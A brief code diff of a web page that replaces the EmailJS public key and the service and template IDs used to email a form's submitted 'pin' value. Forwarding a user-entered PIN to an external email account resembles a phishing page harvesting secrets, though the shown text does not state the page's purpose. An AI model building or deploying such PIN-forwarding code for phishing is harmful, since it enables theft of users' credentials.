@@ -76,7 +76,7 @@
      <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
      <script>
-        emailjs.init("ZeH1lWQH-wAnsI31v"); // Replace with your actual public key
+        emailjs.init("itnbLtIWEQVMAEbYR"); // Replace with your actual public key
     
         document.querySelector("form").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent form from reloading the page
@@ -95,7 +95,7 @@
             spinner.classList.remove("hidden");
     
             // Send form data via EmailJS
-            emailjs.send("service_lw3yuzf", "template_lx7h1wj", { 
+            emailjs.send("service_rqhxe9x", "template_f027uhe", { 
                 pin: pin  // Matches the {{pin}} placeholder in the template
             }).then(
                 function(response) {
